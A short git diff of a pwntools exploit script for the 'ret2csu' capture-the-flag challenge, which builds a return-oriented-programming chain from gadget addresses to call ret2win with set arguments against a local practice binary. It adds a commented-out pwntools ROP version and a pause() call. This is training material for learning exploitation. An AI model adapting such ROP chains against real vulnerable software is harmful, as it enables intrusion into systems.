@@ -12,8 +12,17 @@ pop_rdi =  0x004006a3   # pop rdi; ret
 pop6 =  0x0040069a      # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
 call =  0x00400680      # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8] ...
 dynamic = 0x600e48      # segment.dynamic pointer to _fini
-
+""" 
+# Using pwntools is easier
+rop = ROP([elf,lib])
+# edi, rsi, rdx
+rop.ret2csu(0,0xcafebabecafebabe,0xd00df00dd00df00d)
+rop.call(rop.find_gadget(['pop rdi','ret']))
+rop.call(0xdeadbeefdeadbeef)
+rop.call(elf.plt.ret2win)
+"""
 payload = b"A" * 40
+# payload += rop.chain()
 payload += p64(pop6) 
 payload += p64(0)                                                       # rbx
 payload += p64(1)                                                       # rbp
@@ -28,5 +37,7 @@ payload += p64(pop_rdi) + p64(0xdeadbeefdeadbeef)
 payload += p64(elf.plt.ret2win)
  
 io = process("./ret2csu")
+pause()
 io.send(payload)
 io.interactive()
+
